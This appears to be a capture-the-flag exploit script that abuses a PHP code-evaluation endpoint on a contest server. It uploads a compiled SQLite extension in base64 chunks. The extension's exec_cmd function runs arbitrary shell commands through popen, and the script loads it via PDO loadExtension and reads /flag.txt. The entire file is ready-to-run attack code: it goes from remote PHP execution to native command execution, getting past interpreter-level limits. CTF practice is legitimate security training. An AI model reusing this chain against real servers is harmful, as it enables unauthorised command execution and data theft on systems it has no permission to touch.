import httpx
import asyncio
import subprocess
import base64
import os

URL = "http://techcomfest.1pc.tf:33015"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=10000)

    def eval(self, code: str) -> str:
        return self.c.get(
            "/",
            params={"cmd": code}
        )

class API(BaseAPI):
    ...

async def upload_base64_file(api: BaseAPI, b64_content: str, remote_path: str, chunk_size: int = 4000):
    """Upload base64 in 4-char-aligned chunks to a .b64 file, then decode once."""
    if chunk_size % 4 != 0:
        chunk_size -= (chunk_size % 4)
        if chunk_size <= 0:
            chunk_size = 4

    b64_path = remote_path + '.b64'

    total = len(b64_content)
    first = True
    for i in range(0, total, chunk_size):
        chunk = b64_content[i:i+chunk_size]
        php = (
            "file_put_contents('%s','%s');echo 'ok';"
            if first else
            "file_put_contents('%s','%s',FILE_APPEND);echo 'ok';"
        ) % (b64_path, chunk)
        r = await api.eval(php)
        _ = r.text
        first = False

    decode = await api.eval(
        """
$b64 = file_get_contents('%s');
file_put_contents('%s', base64_decode($b64));
clearstatcache();
$s = @filesize('%s');
var_dump($s !== false ? ('size=' . $s) : 'size_error');
        """ % (b64_path, remote_path, remote_path)
    )
    print(decode.text.strip())

def build_shared_object():
    """Build the shared object and return base64 encoded content"""
    c_file = "hello.c"
    so_file = "libhello_fd.so"
    
    # Create the C source if it doesn't exist
    if not os.path.exists(c_file):
        c_source = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3ext.h>

SQLITE_EXTENSION_INIT1

// Simple function that prints "Hello from shared object!"
static void hello_function(sqlite3_context *context, int argc, sqlite3_value **argv) {
    sqlite3_result_text(context, "Hello from shared object!", -1, SQLITE_STATIC);
}

// Function to execute system commands and return output
static void exec_function(sqlite3_context *context, int argc, sqlite3_value **argv) {
    if (argc < 1) {
        sqlite3_result_error(context, "exec_function requires one argument", -1);
        return;
    }
    
    const char *command = (const char*)sqlite3_value_text(argv[0]);
    if (command == NULL) {
        sqlite3_result_error(context, "exec_function: invalid command", -1);
        return;
    }
    
    // Execute command and capture output
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        sqlite3_result_error(context, "Failed to execute command", -1);
        return;
    }
    
    char buffer[4096];
    char output[8192] = "";
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(output, buffer, sizeof(output) - strlen(output) - 1);
    }
    
    int exit_code = pclose(fp);
    
    // If we got output, return it; otherwise return exit code info
    if (strlen(output) > 0) {
        sqlite3_result_text(context, output, -1, SQLITE_TRANSIENT);
    } else {
        char result_str[128];
        snprintf(result_str, sizeof(result_str), "Command executed with exit code: %d", exit_code);
        sqlite3_result_text(context, result_str, -1, SQLITE_STATIC);
    }
}

// Extension entry point
int sqlite3_hellofd_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
    SQLITE_EXTENSION_INIT2(pApi);
    
    // Register our custom functions
    sqlite3_create_function(db, "hello", 0, SQLITE_UTF8, 0, hello_function, 0, 0);
    sqlite3_create_function(db, "exec_cmd", 1, SQLITE_UTF8, 0, exec_function, 0, 0);
    
    return SQLITE_OK;
}'''
        
        with open(c_file, 'w') as f:
            f.write(c_source)
        print(f"Created {c_file}")
    
    # Compile the shared object
    compile_cmd = [
        "gcc", 
        "-shared", 
        "-fPIC", 
        "-o", so_file,
        c_file,
        "-lsqlite3"
    ]
    
    try:
        print(f"Compiling {c_file} into {so_file}...")
        result = subprocess.run(compile_cmd, check=True, capture_output=True, text=True)
        print(f"Successfully compiled {so_file}")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e}")
        print(f"Error output: {e.stderr}")
        return None
    except FileNotFoundError:
        print("Error: gcc not found. Please install gcc to compile the shared object.")
        return None
    
    # Read and encode the shared object
    try:
        with open(so_file, 'rb') as f:
            so_content = f.read()
            return base64.b64encode(so_content).decode()
    except Exception as e:
        print(f"Error reading {so_file}: {e}")
        return None
    finally:
        os.remove(c_file)
        os.remove(so_file)

async def main():
    api = API()
    print("=== Building Shared Object ===")
    
    # Build the shared object
    payload_content = build_shared_object()
    if not payload_content:
        print("Failed to build shared object!")
        return
    
    print(f"Base64 content length: {len(payload_content)} characters")
    print("=== Uploading and Executing ===")
    
    # Upload the shared object in chunks to avoid 414
    print("Uploading shared object in chunks...")
    await upload_base64_file(api, payload_content, '/tmp/libhello_fd.so', chunk_size=4000)
    
    # Load and test the extension
    print("Loading extension and testing...")
    res = await api.eval(r"""
error_reporting(-1);
try {
    $db = new Pdo\Sqlite('sqlite::memory:');
    $db->loadExtension('/tmp/libhello_fd.so');
    var_dump("Extension loaded successfully");
    
    // Test our custom functions
    $result = $db->query("SELECT hello()")->fetchColumn();
    var_dump("hello() result: " . $result);
    
    // Test exec function with different commands
    $commands = [
        'cat /flag.txt',
    ];
    
    foreach ($commands as $cmd) {
        $exec_result = $db->query("SELECT exec_cmd('" . $cmd . "')")->fetchColumn();
        var_dump("exec_cmd('" . $cmd . "'): " . $exec_result);
    }
    
} catch (Throwable $e) {
    var_dump("Error: " . $e->getMessage());
}
""")
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())